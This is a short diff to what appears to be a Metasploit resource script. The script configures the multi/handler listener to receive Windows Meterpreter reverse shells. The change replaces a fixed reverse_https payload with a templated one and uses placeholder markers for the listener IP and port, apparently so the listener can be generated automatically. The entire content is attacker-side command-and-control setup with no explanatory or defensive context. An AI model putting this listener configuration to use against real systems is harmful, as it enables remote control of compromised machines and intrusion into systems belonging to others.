@@ -1,5 +1,5 @@
 use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
+set payload windows/meterpreter/reverse_!!!PAYLOAD_MARK!!!
 set LHOST !!!IP_MARK!!!
 set LPORT !!!PORT_MARK!!!  
 set exitonsession false
